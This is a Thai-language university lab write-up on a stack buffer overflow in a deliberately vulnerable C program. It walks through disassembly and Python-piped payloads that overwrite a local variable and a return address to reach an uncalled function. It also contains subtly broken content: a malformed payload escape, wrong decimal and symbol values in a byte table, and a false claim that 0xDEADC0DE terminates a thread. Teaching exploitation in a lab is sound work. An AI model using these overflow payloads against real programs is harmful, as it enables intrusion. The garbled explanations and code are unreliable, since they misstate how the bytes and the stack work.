# Lab 5 Buffer Overflow

## ของที่ต้องใช้

1.Download Lab 5 VM image (Windows 7 32-bit) from one of the following URLs
[Click Here To Download](http://10.34.110.201/Security-Lab-5-buffer-overflow.ova)  ~4.5 GB

2.Virtual Box

## ติดตั้งกันเลย

หลังจากดาวน์โหลดไฟล์เสร็จก็ดับเบิ้ลคลิกไปเรื่อยๆและทำตามที่โปรแกรม Virtual Box แนะนำก็สามารถเปิดได้แล้ว

## เข้าสู่ Windows 7 Enterprise 

หลังจากเข้าได้แล้ว Activated วินโดวส์กันสักหน่อยเพื่อยืดอายุให้ไปอีกนิด (30 วัน)

    1. กดที่ปุ่มสตาร์ท > All Programs > Accessories > คลิกขวาที่ command prompt > Run as Administrator
    2. พิมพ์คำว่า slmgr /rearm จากนั้นกดปุ่มรีสตาร์ทเครื่อง
    3. เสร็จเรียบร้อย

## เริ่มทำแล็ป

    1. เข้าไปที่โฟลเดอร์ Documents 
    2. จากนั้นดับเบิ้ลคลิกที่ไฟล์ lab5.c มันจะเปิดโปรแกรม Dev-C++ ให้เอง
    3. เมื่อโปรแกรมเปิดขึ้นมาแล้วให้กด F9 เพื่อทำการคอมไพล์ตัวโค้ดออกมา

## อธิบายตัวโค้ดแต่ละส่วน

```C++
#include <stdio.h>
#include <string.h>

void temp() {
	/* nothing here */
}

void secret_function(){
	printf("************************************************************\n");
	printf("  Congratulation!! You have access to the secret function.\n");
	printf("************************************************************\n");
}

int main(void){
	int a=0x11223344;
	int b=0x55667788;
	char name[200];

	/* print address & value of all variables */	
	printf("------------------------BEFORE------------------------------\n");
	printf("   a: address=%p \t value=%10d (hex=%08x)\n", &a, a, a);
	printf("   b: address=%p \t value=%10d (hex=%08x)\n", &b, b, b);
	printf("name: address=%p\n", &name);
	printf("secret_function: address=%p\n", secret_function);
	printf("------------------------------------------------------------\n");
	
	/* getting a string and print it out */
	printf("ITCS461: Computer and Communication Security Lab 5\n");
	printf("Enter your name: ");
	scanf("%s", name);
	printf("Hello ... %s\n", name);
	printf("Your name's length = %d\n", strlen(name));
	
	/* check if the user is allowed */
	if(a == 0xDEADC0DE) {
		printf("\nCongratulations! You are logged in.\n\n");	
	} else {
		printf("\nSorry, You are not allowed here.\n\n");
	}

	/* print address & value of all variables */
	printf("------------------------AFTER------------------------------\n");
	printf("   a: address=%p \t value=%10d (hex=%08x)\n", &a, a, a);
	printf("   b: address=%p \t value=%10d (hex=%08x)\n", &b, b, b);
	printf("name: address=%p\n", &name);
	printf("secret_function: address=%p\n", secret_function);
	printf("------------------------------------------------------------\n");
	
	return 0;
}
```
เริ่มที่ main(void) ก่อน

```C++
	int a=0x11223344;
	int b=0x55667788;
	char name[200];
```

a กับ b คือ ตัวแปรชนิดเลขจำนวนเต็ม (integer) โดยมีค่าที่กำหนดให้เป็น 0x11223344 และ 0x55667788 

```C++
	int a=0x11223344; // มีค่า 0x11223344 ในรูปแบบเลขฐาน 16 (Hexadecimal) หรือ 287,454,020 ในรูปแบบเลขฐาน 10 (Decimal)
	int b=0x55667788; // มีค่า 0x55667788 ในรูปแบบเลขฐาน 16 (Hexadecimal) หรือ 1,432,778,632 ในรูปแบบเลขฐาน 10 (Decimal)
    char name[200]; // เก็บค่าสตริงเป็นอาเรย์โดยมีขนาด 200 ช่องหรือตำแหน่งที่สามารถเก็บตัวอักษรหรือสตริงได้
```

```C++
	printf("------------------------BEFORE------------------------------\n");
	printf("   a: address=%p \t value=%10d (hex=%08x)\n", &a, a, a);
	printf("   b: address=%p \t value=%10d (hex=%08x)\n", &b, b, b);
	printf("name: address=%p\n", &name);
	printf("secret_function: address=%p\n", secret_function);
	printf("------------------------------------------------------------\n");

	printf("------------------------AFTER------------------------------\n");
	printf("   a: address=%p \t value=%10d (hex=%08x)\n", &a, a, a);
	printf("   b: address=%p \t value=%10d (hex=%08x)\n", &b, b, b);
	printf("name: address=%p\n", &name);
	printf("secret_function: address=%p\n", secret_function);
	printf("------------------------------------------------------------\n");
```

ตรงนี้เอาไว้แสดงผลลัพธ์ซึ่ง %p เอาไว้แสดงผลพ้อยเตอร์หรือตำแหน่ง address ที่ค่าแต่ละค่าได้ทำการจองไว้ ส่วน %08x เอาไว้แสดงค่าในรูปแบบเลขฐานสิบหก (Hexadecimal) โดยเลขที่อยู่ข้างหน้าหมายถึงแสดงเลขออกมากี่ตำแหน่งนั่นเอง

```C++
	printf("ITCS461: Computer and Communication Security Lab 5\n");
	printf("Enter your name: ");
	scanf("%s", name);
	printf("Hello ... %s\n", name);
	printf("Your name's length = %d\n", strlen(name));
```
ตรงนี้เอาไว้รับค่าผ่าน scanf และ printf เพื่อทำการแสดงผลลัพธ์ออกมา

```C++
	if(a == 0xDEADC0DE) {
		printf("\nCongratulations! You are logged in.\n\n");	
	} else {
		printf("\nSorry, You are not allowed here.\n\n");
	}
```
เอาไว้เช็คเงื่อนไขถ้าตัวแปร a เท่ากับค่า 0xDEADCODE ได้จะให้ทำอะไรต่อและถ้าไม่ใช่ให้ทำอะไรต่อ 

```C++
void secret_function(){
	printf("************************************************************\n");
	printf("  Congratulation!! You have access to the secret function.\n");
	printf("************************************************************\n");
```
ตรงนี้เป็นฟังก์ชั่นที่ไม่น่าจะเกี่ยวอะไรเพราะไม่มีการเรียกไปใช้ แต่ในแลปนี้เราสามารถเรียกให้มันแสดงผลลัพธ์ออกมาได้

## อะไรคือ 0xDEADC0DE กันล่ะ

0xDEADC0DE หรือ 0xDEAD ใน hexadecimal เป็นโค้ดที่ทำให้ตัวโปรแกรมจบการทำงานทันที หรือที่เรียกว่า **_thread_terminated** ซึ่ง terminated thread ก็เหมือนกับการบังคับทำให้โค้ดจบหรือตายในทันที (**DEAD**)
ซึ่ง **0xDEADBEEF** ก็มีความสามารถเหมือนกับ **0xDEADC0DE** เลยแหละ

```bash
0xDEADCODE # HEX มีค่าเท่ากับ 3735929054 ฐานสิบ
# ถอดออกมาทีละคู่จะได้
\xDE    \xAD          \xC0     \xDE -> Hexadecimal
222      12           173       222 -> Decimal
 Þ    Form Feed   Soft Hyphen    Þ  -> Symbol
\xDE    \xC0          \xAD     \xDE -> Reverse from Hexadecimal 
    
```

ถอดรหัสออกมาไว้ก่อนนะเดี๋ยวอธิบายต่อ

## เริ่มรันกันจริงๆแล้วนะ

ตอนแรกที่เรารันกันปกติจะมีให้ scanf เพื่อรับค่าปกติแต่พอใส่ค่าไปจริงๆแล้วก็ดันขึ้นว่า "Sorry, You are not allowed here" ซะงั้น ซึ่งการที่จะทำให้มันเข้าเงื่อนไข a == 0xDEADC0DE  ได้มันก็ยากอยู่นะ แต่ก็มีวิธีจริงๆนั่นแหละคือใช้ภาษาอื่นเข้ามาช่วยพร้อมกับใช้ | หรือ pipeline ตามด้วยชื่อไฟล์ทีีี่จะรัน

```bash
python -c "print('abc')" | lab5.exe 
```

ซึ่งตรงนี้สามารถเรียกโปรแกรม lab5 ขึ้นมาพร้อมกับใส่ input abc เข้าไปในโปรแกรมได้เลยทันทีแต่การจะเข้า condition นั้นใช้วิธีนี้

```bash
python -c "print('a' * 204 + '\xDE\xC0\xAD\DE')" | lab5.exe
```

ซึ่ง 'a' * 204 + '\xDE\xC0\xAD\DE' นั้นมีความหมายแบบโดยให้ a เป็น string ตัวแรกคูณด้วย 204 ซึ่งจะมี a ทั้งหมด 204 ตัวบวกด้วย reverse ของ 0xDEADC0DE ซึ่งก็คือ 0xDEC0ADDE
ซึ่ง 0xDEC0ADDE ใน hex นั้นจะเป็น string เพิ่มมาอีก 4 ตัวแล้วลองกด enter เพื่อใส่เข้าไปก็สามารถผ่าน if else ได้เลย เดิมที name[200] มันเก็บ string ได้แค่ 200 แต่จริงๆแล้วมันสามารถเก็บได้เกินตัวมันอีกแหน่ะ ซึ่งตัวนี้ **0xdc** ในทาง decimal มันมีค่าถึง 220 เลย ซึ่งหมายความว่ามันจองหน่วยความจำไว้ 220 ช่องนั่นเอง ส่วน 'a' * 204 + '\xDE\xC0\xAD\DE' ซึ่ง 204 ทำไมถึงต้องเป็น 204 น่ะหรอ มันเกิดจากการ shift เลข bit นั่นแหละซึ่งเราลองเปลี่ยนเลขไปเรื่อยก็ได้แบบนี้

```bash
'a' * 208 + '\xDE\xC0\xAD\DE' -> hex=61616161 # ของ a เท่ากับ address b ละ
'a' * 207 + '\xDE\xC0\xAD\DE' -> hex=de616161 # ของ a
'a' * 206 + '\xDE\xC0\xAD\DE' -> hex=c0de6161 # ของ a
'a' * 205 + '\xDE\xC0\xAD\DE' -> hex=adc0de61 # ของ a
'a' * 204 + '\xDE\xC0\xAD\DE' -> hex=deadc0de # ของ a ที่เราต้องการ
'a' * 203 + '\xDE\xC0\xAD\DE' -> hex=00deadc0 # ของ a
'a' * 202 + '\xDE\xC0\xAD\DE' -> hex=1100dead # ของ a
'a' * 201 + '\xDE\xC0\xAD\DE' -> hex=112200de # ของ a
'a' * 200 + '\xDE\xC0\xAD\DE' -> hex=11223300 # ของ a
'a' * 199 + '\xDE\xC0\xAD\DE' -> hex=11223344 # ของ a
```

```bash
\xDE\xAD\xC0\xDE  # DEADC0DE จาก if a = 0xDEADC0DE
# ให้เรามองค่า hex แบบย้อนกลับจะสามารถนำมาใช้ได้ 0xDEADC0DE 
# 0xDEADC0DE มองย้อนกลับจะได้ 0xDEC0ADDE
\xDE\xC0\xAD\DE # แบบนี้
```

## เรียกฟังก์ชั่นที่ไม่ได้มีใครเรียก
```C++
void secret_function(){
	printf("************************************************************\n");
	printf("  Congratulation!! You have access to the secret function.\n");
	printf("************************************************************\n");
}
```

ซึ่ง secret_function() อ่ะมันมีเลข address เป้น 00401356 ใช่ป่ะให้เราเก็บไว้ในใจก่อนแล้วนำมันมา reverse เลย

```bash

00401356
\x00\x40\x13\x56  -> Hexadecimal
\x56\x13\x40\x00  -> Hexadecimal Reverse # เราจะใช้ตัวนี้
  V   ‼   @  null -> Symbol
# จะเห็นได้ว่ามีค่าแค่ 3 ตัวเท่านั้น 

```
โค้ดที่ใช้คือตัวนี้
```bash
Python -c  "print('a' * 220 +  '\x56\x13\x40\x00')" | lab5.exe
```
เดิมที name[200] มันเก็บ string ได้แค่ 200 แต่จริงๆแล้วมันสามารถเก็บได้เกินตัวมันอีกแหน่ะ ซึ่งตัวนี้ **0xdc** ในทาง decimal มันมีค่าถึง 220 เลย ซึ่งหมายความว่ามันจองหน่วยความจำไว้ 220 ช่องนั่นเอง

มาดูโค้ด assembly จาก lab5 กัน
```Rust
00401356 <_secret_function>:
  401356:	55                   	push   %ebp
  401357:	89 e5                	mov    %esp,%ebp
  401359:	83 ec 18             	sub    $0x18,%esp
  40135c:	c7 04 24 24 30 40 00 	movl   $0x403024,(%esp)
  401363:	e8 28 0a 00 00       	call   401d90 <_puts>
  401368:	c7 04 24 64 30 40 00 	movl   $0x403064,(%esp)
  40136f:	e8 1c 0a 00 00       	call   401d90 <_puts>
  401374:	c7 04 24 24 30 40 00 	movl   $0x403024,(%esp)
  40137b:	e8 10 0a 00 00       	call   401d90 <_puts>
  401380:	90                   	nop
  401381:	c9                   	leave  
  401382:	c3                   	ret    

00401383 <_main>:
  401383:	55                   	push   %ebp
  401384:	89 e5                	mov    %esp,%ebp
  401386:	83 e4 f0             	and    $0xfffffff0,%esp
  401389:	81 ec e0 00 00 00    	sub    $0xe0,%esp
  40138f:	e8 8c 07 00 00       	call   401b20 <___main>
  401394:	c7 84 24 dc 00 00 00 	movl   $0x11223344,0xdc(%esp)
  40139b:	44 33 22 11 
  40139f:	c7 84 24 d8 00 00 00 	movl   $0x55667788,0xd8(%esp)
  4013a6:	88 77 66 55 
  4013aa:	c7 04 24 a0 30 40 00 	movl   $0x4030a0,(%esp)
  4013b1:	e8 da 09 00 00       	call   401d90 <_puts>
  4013b6:	8b 94 24 dc 00 00 00 	mov    0xdc(%esp),%edx
  4013bd:	8b 84 24 dc 00 00 00 	mov    0xdc(%esp),%eax
  4013c4:	89 54 24 0c          	mov    %edx,0xc(%esp)
  4013c8:	89 44 24 08          	mov    %eax,0x8(%esp)
  4013cc:	8d 84 24 dc 00 00 00 	lea    0xdc(%esp),%eax
  4013d3:	89 44 24 04          	mov    %eax,0x4(%esp)
  4013d7:	c7 04 24 e0 30 40 00 	movl   $0x4030e0,(%esp)
  4013de:	e8 b5 09 00 00       	call   401d98 <_printf>
  4013e3:	8b 94 24 d8 00 00 00 	mov    0xd8(%esp),%edx
  4013ea:	8b 84 24 d8 00 00 00 	mov    0xd8(%esp),%eax
  4013f1:	89 54 24 0c          	mov    %edx,0xc(%esp)
  4013f5:	89 44 24 08          	mov    %eax,0x8(%esp)
  4013f9:	8d 84 24 d8 00 00 00 	lea    0xd8(%esp),%eax
  401400:	89 44 24 04          	mov    %eax,0x4(%esp)
  401404:	c7 04 24 0c 31 40 00 	movl   $0x40310c,(%esp)
  40140b:	e8 88 09 00 00       	call   401d98 <_printf>
  401410:	8d 44 24 10          	lea    0x10(%esp),%eax
  401414:	89 44 24 04          	mov    %eax,0x4(%esp)
  401418:	c7 04 24 36 31 40 00 	movl   $0x403136,(%esp)
  40141f:	e8 74 09 00 00       	call   401d98 <_printf>
  401424:	c7 44 24 04 56 13 40 	movl   $0x401356,0x4(%esp)
  40142b:	00 
```

เราสังเกตว่ามีการใช้ 0xDC เยอะผิดปกติประกอบกับว่าตัว charที่ให้มาถึง 200 ช่องนั้นมีอะไรเกี่ยวกันหรือไม่ ซึ่ง 0xdc(%esp),%edx ตัวนี้มันดันมี esp กับ edx มาด้วยซึ่ง esp มันคือ stack pointer เอาไว้ชี้ address ที่มันกองซ้อนๆกัน ประกอบกับ edx คือ register 

```Rust
  4013b6:	8b 94 24 dc 00 00 00 	mov    0xdc(%esp),%edx
  4013bd:	8b 84 24 dc 00 00 00 	mov    0xdc(%esp),%eax
```
จะเห็นได้ว่ามีการ move 0xdc ที่ใช้ stack pointer ไปที่ edx ตลอด ซึ่งเราสามารถใช้ตัว 0xdc นี้ให้เป็นประโยชน์ได้

```Rust
0xDC or 0xdc // ในฐาน 16 มีค่าเท่ากับ 220 ในฐานสิบ
```
กลับมาที่ char name[200] กันต่อซึ่ง name[200] ตัวนี้ใช้ 0xdc ที่มีค่า 220 เพื่อจองหน่วยความจำไว้ให้ 220 bytes ส่วนอีก 4 bytes จะเก็บที่ esp ในกรณีพิเศษ ซึ่งหมายความว่า 220 bytes เนี้ยมันจะสุ่มอะไรก็ได้ออกมาก็ได้ ส่วนอีก 4 bytes เนี่ยมันเอาไว้เรียกฟังก์ชั่นที่ไม่ได้มีใครเรียกหรือ special function() นั่นเอง ซึ่งเท่า 220+4 = 224 bytes ที่เราจะใช้นั่นเอง

```bash
Python -c  "print('a' * 220 +  '\x56\x13\x40\x00')" | lab5.exe
```

```bash
Python -c  "print('a' * 220 +  '\x56\x13\x40\x00')" 
                   ^     ^              ^
                   |     |              |
                ตัวไรก็ได้   0xdc  reverse ของ special function  
```